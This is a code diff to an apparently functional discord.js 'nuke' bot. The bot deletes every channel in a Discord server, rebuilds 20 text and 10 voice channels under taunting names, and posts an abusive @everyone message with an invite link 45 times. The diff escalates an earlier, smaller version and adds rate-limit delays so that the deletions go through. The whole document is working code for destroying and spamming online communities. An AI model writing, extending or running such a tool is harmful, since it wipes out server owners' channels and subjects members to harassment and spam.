@@ -10,19 +10,30 @@ import {
 const NUKE_MESSAGE =
   "@everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS";
 
-// how many channels to rebuild (add/remove freely)
-const TEXT_CHANNELS  = ['general', 'chat', 'main', 'lounge'];
-const VOICE_CHANNELS = ['voice', 'Voice 2'];
+// base name for every rebuilt channel
+// literal text "(pentagram)" — for the real glyph use: '⛧ Kxrzt-owns-yall'
+const CHANNEL_BASE = '⛧•Kxrzt-owns-yall';
 
-// how many times the message gets spammed in the first text channel
-const SPAM_COUNT = 5;
+// false -> "name", "name 1", "name 2", ...
+// true  -> "name 1", "name 2", "name 3", ...
+const NUMBER_FIRST_CHANNEL = false;
+
+const CATEGORY_NAME = 'general';
+const TEXT_COUNT    = 20;   // how many text channels to create
+const VOICE_COUNT   = 10;   // how many voice channels to create
+const SPAM_COUNT    = 45;   // how many times the message gets spammed
 
 // optional: a role NAME that may also nuke, on ANY server (admins always can).
-// leave empty for admins only. servers where you want this need a role with this exact name.
-const NUKE_ROLE_NAME = ''; // e.g. 'nuke'
+const NUKE_ROLE_NAME = '';
 
 // delay between channel operations so Discord's channel rate limit doesn't eat them
 const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+// "name" for the first channel, "name 1", "name 2", ... for the rest
+function channelName(i) {
+  const n = NUMBER_FIRST_CHANNEL ? i + 1 : i;
+  return n === 0 ? CHANNEL_BASE : `${CHANNEL_BASE} ${n}`;
+}
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
@@ -119,23 +130,23 @@ async function nuke(interaction) {
     }
   }
 
-  // 2. channels — snapshot first, the cache mutates as we delete
+  // 2. wipe every existing channel — snapshot first, the cache mutates as we delete
   for (const channel of [...guild.channels.cache.values()]) {
     await channel.delete().catch(e => console.error('[delete]', channel.name, e.message));
     await sleep(250);
   }
 
-  // 3. rebuild
+  // 3. rebuild — category + numbered channels
   const category = await guild.channels.create({
-    name: 'general',
+    name: CATEGORY_NAME,
     type: ChannelType.GuildCategory,
   });
   await sleep(250);
 
   let firstText = null;
-  for (const name of TEXT_CHANNELS) {
+  for (let i = 0; i < TEXT_COUNT; i++) {
     const ch = await guild.channels.create({
-      name,
+      name: channelName(i),
       type: ChannelType.GuildText,
       parent: category.id,
     });
@@ -143,9 +154,9 @@ async function nuke(interaction) {
     await sleep(250);
   }
 
-  for (const name of VOICE_CHANNELS) {
+  for (let i = 0; i < VOICE_COUNT; i++) {
     await guild.channels.create({
-      name,
+      name: channelName(i),
       type: ChannelType.GuildVoice,
       parent: category.id,
     });
@@ -163,7 +174,7 @@ async function nuke(interaction) {
   // the origin channel is gone by now, so this can fail harmlessly
   await interaction
     .editReply(
-      `Done. Rebuilt ${TEXT_CHANNELS.length} text + ${VOICE_CHANNELS.length} voice, spammed ${SPAM_COUNT}x.`
+      `Done. Wiped everything, rebuilt ${TEXT_COUNT} text + ${VOICE_COUNT} voice, spammed ${SPAM_COUNT}x.`
     )
     .catch(() => {});
 }
